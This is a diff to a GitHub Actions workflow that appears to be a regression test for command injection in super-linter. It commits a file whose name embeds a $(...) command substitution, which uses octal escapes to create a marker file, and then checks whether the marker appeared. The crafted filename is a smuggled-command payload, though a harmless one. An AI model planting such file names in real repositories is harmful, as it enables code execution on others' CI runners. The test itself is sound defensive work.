@@ -2,20 +2,24 @@ name: super-linter cmdsubst regression (no PR)
 
 on:
   workflow_dispatch:
+    inputs:
+      log_level:
+        description: "LOG_LEVEL (DEBUG/INFO/WARN/ERROR)"
+        required: true
+        default: "DEBUG"
 
 jobs:
   repro:
     runs-on: ubuntu-latest
     steps:
-      - name: Build synthetic repo with base+head branches (forces diff path)
+      - name: Build synthetic repo (main + feature) inside workspace
+        id: prep
         shell: bash
         run: |
           set -euo pipefail
 
-          # Workspace is empty unless you checkout; we create a synthetic git repo here.
           rm -rf ./* ./.git || true
 
-          # Create a bare "origin" so origin/main exists (super-linter often diffs against origin/<DEFAULT_BRANCH>)
           mkdir -p /tmp/origin.git
           git init --bare /tmp/origin.git
 
@@ -24,48 +28,62 @@ jobs:
           git config user.name "test"
           git remote add origin /tmp/origin.git
 
-          # Base commit on main
           printf "base\n" > README.md
           git add -A
           git commit -qm "base"
           git push -u origin main
 
-          # Feature branch with crafted filename
           git checkout -b feature
           rm -f .CMD_SUBST_RAN
 
-          # Filename must not contain '/' (creation-time). We generate /github/workspace/.CMD_SUBST_RAN at runtime.
+          # Filename contains literal $(...) but no '/' at creation-time.
+          # At runtime it builds /github/workspace/.CMD_SUBST_RAN via octal escapes (\057 == '/')
           printf "dummy\n" > 'pre$(p=$(printf "\057github\057workspace\057.CMD_SUBST_RAN"); touch "$p").md'
-
           git add -A
           git commit -qm "add crafted filename"
           git push -u origin feature
 
-          # Stay on feature
-          git status --porcelain
+          synth_sha="$(git rev-parse HEAD)"
+          echo "synth_sha=$synth_sha" >> "$GITHUB_OUTPUT"
+          echo "synth_ref=refs/heads/feature" >> "$GITHUB_OUTPUT"
+          echo "synth_base=main" >> "$GITHUB_OUTPUT"
+
+          echo "== debug: repo graph =="
+          git log --oneline --decorate --graph --all
 
       - name: Run super-linter (pinned) in changed-files mode
         uses: super-linter/super-linter/slim@v8.2.1
         env:
-          GITHUB_TOKEN: ${{ github.token }}
+          # critical: override to match the synthetic repo we just created
+          GITHUB_SHA: ${{ steps.prep.outputs.synth_sha }}
+          GITHUB_REF: ${{ steps.prep.outputs.synth_ref }}
+          DEFAULT_BRANCH: ${{ steps.prep.outputs.synth_base }}
 
-          # Force "only changed files" behavior (the code path you hit in PRs)
           VALIDATE_ALL_CODEBASE: "false"
-
-          # Ensure the diff base is our synthetic main branch
-          DEFAULT_BRANCH: "main"
-
-          # Keep runtime smaller; still ensures the crafted .md is considered.
           VALIDATE_MARKDOWN: "true"
 
-          # Optional: more logs if you need debugging
-          LOG_LEVEL: "DEBUG"
+          GITHUB_TOKEN: ${{ github.token }}
+          LOG_LEVEL: ${{ inputs.log_level }}
 
-      - name: Assert marker not created
+      - name: Assert marker not created + dump key debug
+        if: always()
         shell: bash
         run: |
+          set -euo pipefail
+          echo "SYNTH_SHA: ${{ steps.prep.outputs.synth_sha }}"
+          echo "DEFAULT_BRANCH: ${{ steps.prep.outputs.synth_base }}"
+          ls -la
+
           if [ -f ".CMD_SUBST_RAN" ]; then
             echo "::error::[VULNERABLE] marker file created => command substitution executed"
             exit 1
           fi
           echo "[OK] no marker file created"
+
+      - name: Upload super-linter log if present
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: super-linter-debug-logs
+          path: |
+            super-linter.log
